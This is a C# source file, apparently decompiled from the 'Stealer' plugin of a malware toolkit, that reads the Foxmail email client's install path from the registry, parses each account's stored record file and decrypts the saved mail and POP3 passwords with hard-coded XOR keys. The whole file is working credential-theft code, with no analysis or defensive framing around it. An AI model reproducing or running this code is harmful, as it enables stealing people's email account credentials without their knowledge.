

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using InvokedCommon.Structs;
using Microsoft.Win32;


namespace Plugin.Helper.Stealer
{
	public static class FoxMail
	{
		private static byte[] V6Password = new byte[8]
		{
			(byte) 126,
			(byte) 100,
			(byte) 114,
			(byte) 97,
			(byte) 71,
			(byte) 111,
			(byte) 110,
			(byte) 126
		};
		private static byte V6FirstByteDifference = 90;
		private static byte[] V7Password = new byte[8]
		{
			(byte) 126,
			(byte) 70,
			(byte) 64,
			(byte) 55,
			(byte) 37,
			(byte) 109,
			(byte) 36,
			(byte) 126
		};
		private static byte V7FirstByteDifference = 113;

		public static FoxMailInfo[] GetInfo()
		{
			string foxMailLocation = FoxMail.GetFoxMailLocation();
			if (foxMailLocation == null)
				return (FoxMailInfo[]) null;
			string path = Path.Combine(foxMailLocation, "Storage");
			if (!Directory.Exists(path))
				return (FoxMailInfo[]) null;
			List<FoxMailInfo> foxMailInfoList = new List<FoxMailInfo>();
			foreach (string directory in Directory.GetDirectories(path, "*@*"))
			{
				string str = Path.Combine(directory, "Accounts", "Account.rec0");
				if (File.Exists(str))
				{
					byte[] fileBytes = Utils.ForceReadFile(str);
					if (fileBytes != null)
					{
						bool v6;
						Dictionary<string, string[]> recFileStrings = FoxMail.parseRecFileStrings(fileBytes, out v6);
						if (recFileStrings.ContainsKey("Account") && recFileStrings.ContainsKey("Password") && recFileStrings["Account"].Length == recFileStrings["Password"].Length)
						{
							string[] strArray1 = recFileStrings["Account"];
							string[] strArray2 = recFileStrings["Password"];
							for (int index = 0; index < strArray1.Length; ++index)
							{
								string _account = strArray1[index];
								string _password = FoxMail.DecodePassword(strArray2[index], v6);
								bool flag = false;
								foreach (FoxMailInfo foxMailInfo in foxMailInfoList)
								{
									if (!foxMailInfo.pop3 && foxMailInfo.account == _account && foxMailInfo.password == _password)
									{
										flag = true;
										break;
									}
								}
								if (!flag)
									foxMailInfoList.Add(new FoxMailInfo(_account, _password, false));
							}
						}
						if (recFileStrings.ContainsKey("POP3Account") && recFileStrings.ContainsKey("POP3Password") && recFileStrings["POP3Account"].Length == recFileStrings["POP3Password"].Length)
						{
							string[] strArray3 = recFileStrings["POP3Account"];
							string[] strArray4 = recFileStrings["POP3Password"];
							for (int index = 0; index < strArray3.Length; ++index)
							{
								string _account = strArray3[index];
								string _password = FoxMail.DecodePassword(strArray4[index], v6);
								bool flag = false;
								foreach (FoxMailInfo foxMailInfo in foxMailInfoList)
								{
									if (foxMailInfo.pop3 && foxMailInfo.account == _account && foxMailInfo.password == _password)
									{
										flag = true;
										break;
									}
								}
								if (!flag)
									foxMailInfoList.Add(new FoxMailInfo(_account, _password, true));
							}
						}
					}
				}
			}
			return foxMailInfoList.ToArray();
		}

		private static bool isAscii(int x) => 32 <= x && x <= (int) sbyte.MaxValue;

		private static bool IsMatch(byte[] file, int start, byte[] pattern)
		{
			for (int index = 0; index < pattern.Length; ++index)
			{
				if ((int) file[start + index] != (int) pattern[index])
					return false;
			}
			return true;
		}

		private static Dictionary<string, string[]> parseRecFileStrings(byte[] fileBytes, out bool v6)
		{
			int num1 = 4;
			int num2 = 8;
			byte[] bytes1 = BitConverter.GetBytes(256);
			byte[] bytes2 = BitConverter.GetBytes(num2);
			v6 = fileBytes[0] == (byte) 208;
			Dictionary<string, List<string>> source = new Dictionary<string, List<string>>();
			for (int start = 0; start <= fileBytes.Length - num1; ++start)
			{
				bool flag1 = false;
				bool flag2 = false;
				if (FoxMail.IsMatch(fileBytes, start, bytes1))
					flag2 = true;
				else if (FoxMail.IsMatch(fileBytes, start, bytes2))
					flag1 = true;
				if (flag1 | flag2)
				{
					string str1 = "";
					string str2 = "";
					bool flag3 = false;
					for (int index = start - 1; index > 0; --index)
					{
						try
						{
							if (FoxMail.isAscii((int) fileBytes[index]))
							{
								str1 += ((char) fileBytes[index]).ToString();
							}
							else
							{
								int int32 = BitConverter.ToInt32(fileBytes, index - 3);
								if (int32 != 0)
								{
									if (int32 == str1.Length)
									{
										str1 = Utils.ReverseString(str1);
										flag3 = true;
										break;
									}
									break;
								}
								break;
							}
						}
						catch
						{
							flag3 = false;
							break;
						}
					}
					if (flag3)
					{
						try
						{
							if (flag2)
							{
								int int32 = BitConverter.ToInt32(fileBytes, start + 4);
								str2 = Encoding.UTF8.GetString(fileBytes, start + 8, int32);
							}
							else if (flag1)
							{
								int count = BitConverter.ToInt32(fileBytes, start + 4) * 2;
								str2 = Encoding.Unicode.GetString(fileBytes, start + 8, count);
							}
						}
						catch
						{
							flag3 = false;
						}
					}
					if (flag3)
					{
						if (!source.ContainsKey(str1))
							source[str1] = new List<string>();
						source[str1].Add(str2);
					}
				}
			}
			return source.ToDictionary<KeyValuePair<string, List<string>>, string, string[]>((Func<KeyValuePair<string, List<string>>, string>) (kvp => kvp.Key), (Func<KeyValuePair<string, List<string>>, string[]>) (kvp => kvp.Value.ToArray()));
		}

		private static string GetFoxMailLocation()
		{
			string location = "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command";
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.LocalMachine, location, "");
			if (obj == null || obj.GetType() != typeof (string))
			{
				obj = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, location, "");
				if (obj == null || obj.GetType() != typeof (string))
					return (string) null;
			}
			string str = (string) obj;
			int num = str.LastIndexOf("\"");
			return num > 0 ? Path.GetDirectoryName(str.Substring(1, num - 1)) : (string) null;
		}

		private static byte[] ExtendArrayByX(byte[] array, int x)
		{
			byte[] destinationArray = new byte[array.Length * x];
			for (int index = 0; index < x; ++index)
				Array.Copy((Array) array, 0, (Array) destinationArray, array.Length * index, array.Length);
			return destinationArray;
		}

		private static string DecodePassword(string password_hex, bool v6)
		{
			byte[] array = FoxMail.V7Password;
			byte firstByteDifference = FoxMail.V7FirstByteDifference;
			if (v6)
			{
				array = FoxMail.V6Password;
				firstByteDifference = FoxMail.V6FirstByteDifference;
			}
			byte[] byteArray = Utils.ConvertHexStringToByteArray(password_hex);
			if (byteArray == null)
				return (string) null;
			int x = (byteArray.Length + array.Length - 1) / array.Length;
			byte[] numArray1 = FoxMail.ExtendArrayByX(array, x);
			byteArray[0] ^= firstByteDifference;
			byte[] numArray2 = new byte[byteArray.Length];
			for (int index = 1; index <= numArray2.Length - 1; ++index)
				numArray2[index - 1] = (byte) ((uint) byteArray[index] ^ (uint) numArray1[index - 1]);
			string str = "";
			for (int index = 0; index < numArray2.Length - 1; ++index)
			{
				int num = (int) numArray2[index] - (int) byteArray[index];
				if (num < 0)
					num += (int) byte.MaxValue;
				str += ((char) num).ToString();
			}
			return str;
		}
	}
}
